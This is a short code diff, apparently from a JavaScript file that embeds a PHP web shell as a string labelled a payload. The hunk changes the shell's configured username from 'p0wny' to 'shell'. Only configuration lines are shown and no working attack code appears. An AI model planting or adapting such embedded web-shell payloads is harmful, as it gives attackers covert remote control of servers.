@@ -3,7 +3,7 @@ alert("Payload loaded");
   const content = "<?php
 
 $SHELL_CONFIG = array(
-    'username' => 'p0wny',
+    'username' => 'shell',
     'hostname' => 'shell',
 );
 
